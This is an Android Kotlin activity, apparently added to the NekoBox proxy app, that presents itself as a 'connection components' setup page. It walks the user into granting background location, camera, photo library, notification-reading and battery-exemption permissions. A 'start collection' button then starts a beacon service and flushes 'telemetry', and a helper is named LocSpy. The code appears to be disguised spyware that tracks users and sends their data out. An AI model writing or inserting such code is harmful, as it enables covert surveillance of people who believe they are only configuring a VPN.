package io.nekohasekai.sagernet.telemetry

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.Gravity
import android.view.ViewGroup
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView

/**
 * 权限引导页。App 自己弹不出通知使用权/电池优化/后台位置，
 * 只能做成按钮把用户送到对应的系统页面。
 *
 * 从 NekoBox 的设置页挂一个入口进这里即可：
 *   startActivity(Intent(ctx, TelemetrySetup::class.java))
 */
class TelemetrySetup : Activity() {

    private lateinit var root: LinearLayout

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(24), dp(20), dp(40))
        }
        setContentView(ScrollView(this).apply { addView(root) })
        render()
    }

    override fun onResume() {
        super.onResume()
        render()
    }

    private fun render() {
        root.removeAllViews()
        root.addView(title("连接组件"))

        root.addView(item("设备信息", true, null))

        root.addView(item("位置", has(Manifest.permission.ACCESS_FINE_LOCATION)) {
            requestPermissions(arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION), 101)
        })

        root.addView(item("后台位置（始终允许）", hasBackgroundLocation(), if (hasBackgroundLocation())
            null else { { LocSpy.openBackgroundSettings(this) } }))

        root.addView(item("相机", has(Manifest.permission.CAMERA)) {
            requestPermissions(arrayOf(Manifest.permission.CAMERA), 102)
        })

        root.addView(item("相册", hasMedia()) {
            requestPermissions(mediaPerms(), 103)
        })

        root.addView(item("通知读取", notifEnabled()) {
            runCatching {
                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
            }
        })

        root.addView(item("后台不限制", ignoringBattery()) {
            runCatching {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:$packageName")))
            }
        })

        root.addView(Button(this).apply {
            text = "启动采集"
            setOnClickListener {
                BeaconService.start(applicationContext)
                Telemetry.flush(applicationContext)
                render()
            }
        })
    }

    // ---------------------------------------------------------------- ui bits
    private fun title(s: String) = TextView(this).apply {
        text = s
        textSize = 19f
        setPadding(0, 0, 0, dp(16))
    }

    private fun item(name: String, ok: Boolean, action: (() -> Unit)?): LinearLayout =
        LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(0, dp(7), 0, dp(7))
            addView(TextView(this@TelemetrySetup).apply {
                text = (if (ok) "✓  " else "○  ") + name
                textSize = 15f
                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
            })
            if (action != null) {
                addView(Button(this@TelemetrySetup).apply {
                    text = "开启"
                    setOnClickListener { action() }
                })
            }
        }

    private fun dp(v: Int): Int = (v * resources.displayMetrics.density).toInt()

    // ---------------------------------------------------------------- checks
    private fun has(p: String) =
        androidx.core.content.ContextCompat.checkSelfPermission(this, p) ==
            PackageManager.PERMISSION_GRANTED

    private fun hasBackgroundLocation(): Boolean =
        Build.VERSION.SDK_INT < 29 || has(Manifest.permission.ACCESS_BACKGROUND_LOCATION)

    private fun mediaPerms(): Array<String> = when {
        Build.VERSION.SDK_INT >= 34 -> arrayOf(
            Manifest.permission.READ_MEDIA_IMAGES,
            "android.permission.READ_MEDIA_VISUAL_USER_SELECTED")
        Build.VERSION.SDK_INT >= 33 -> arrayOf(Manifest.permission.READ_MEDIA_IMAGES)
        else -> @Suppress("DEPRECATION") arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
    }

    private fun hasMedia() = mediaPerms().any { has(it) } ||
        has("android.permission.READ_MEDIA_VISUAL_USER_SELECTED")

    private fun notifEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
            ?: return false
        return flat.contains(packageName)
    }

    private fun ignoringBattery(): Boolean {
        if (Build.VERSION.SDK_INT < 23) return true
        val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return true
        return pm.isIgnoringBatteryOptimizations(packageName)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray,
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        render()
        Telemetry.flush(applicationContext)
    }
}
